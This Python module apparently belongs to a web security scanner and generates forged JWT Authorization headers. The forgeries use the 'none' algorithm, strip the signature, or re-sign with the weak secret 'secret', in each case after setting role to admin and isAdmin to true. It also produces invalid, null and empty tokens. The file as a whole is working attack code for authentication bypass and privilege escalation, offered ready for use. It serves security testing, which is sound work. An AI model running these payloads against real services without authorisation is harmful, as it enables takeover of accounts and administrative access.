"""
Authentication Attack Patterns
Practical JWT attack payload generator (scanner-ready)
"""

import jwt
import time
import json
import base64
from typing import List, Dict, Any


class AuthAttackGenerator:

    def __init__(self):
        pass

    # -------------------------
    # CORE ENTRY
    # -------------------------
    def generate_jwt_attacks(self, token: str = None) -> List[Dict[str, Any]]:
        attacks = []

        if not token:
            return []

        attacks.extend(self._none_alg_attack(token))
        attacks.extend(self._no_signature_attack(token))
        attacks.extend(self._role_escalation_attack(token))
        attacks.extend(self._invalid_token_attack())
        attacks.extend(self._empty_token_attack())

        return attacks

    # -------------------------
    # HELPERS
    # -------------------------
    def _b64(self, data):
        return base64.urlsafe_b64encode(json.dumps(data).encode()).rstrip(b"=").decode()

    def _decode(self, token):
        try:
            parts = token.split(".")
            return json.loads(base64.urlsafe_b64decode(parts[1] + "=="))
        except:
            return None

    # -------------------------
    # ATTACKS
    # -------------------------

    def _none_alg_attack(self, token):
        payload = self._decode(token)
        if not payload:
            return []

        payload["role"] = "admin"

        header = {"alg": "none", "typ": "JWT"}
        forged = f"{self._b64(header)}.{self._b64(payload)}."

        return [{
            "__headers__": {"Authorization": f"Bearer {forged}"},
            "__attack_type__": "JWT None Algorithm",
            "__severity__": "CRITICAL"
        }]

    def _no_signature_attack(self, token):
        parts = token.split(".")
        if len(parts) != 3:
            return []

        forged = f"{parts[0]}.{parts[1]}."

        return [{
            "__headers__": {"Authorization": f"Bearer {forged}"},
            "__attack_type__": "JWT No Signature",
            "__severity__": "CRITICAL"
        }]

    def _role_escalation_attack(self, token):
        payload = self._decode(token)
        if not payload:
            return []

        payload["role"] = "admin"
        payload["isAdmin"] = True

        forged = jwt.encode(payload, "secret", algorithm="HS256")

        return [{
            "__headers__": {"Authorization": f"Bearer {forged}"},
            "__attack_type__": "JWT Role Escalation",
            "__severity__": "CRITICAL"
        }]

    def _invalid_token_attack(self):
        return [
            {
                "__headers__": {"Authorization": "Bearer invalid.token.here"},
                "__attack_type__": "Invalid Token",
                "__severity__": "HIGH"
            },
            {
                "__headers__": {"Authorization": "Bearer null"},
                "__attack_type__": "Null Token",
                "__severity__": "MEDIUM"
            }
        ]

    def _empty_token_attack(self):
        return [{
            "__headers__": {"Authorization": ""},
            "__attack_type__": "Empty Token",
            "__severity__": "MEDIUM"
        }]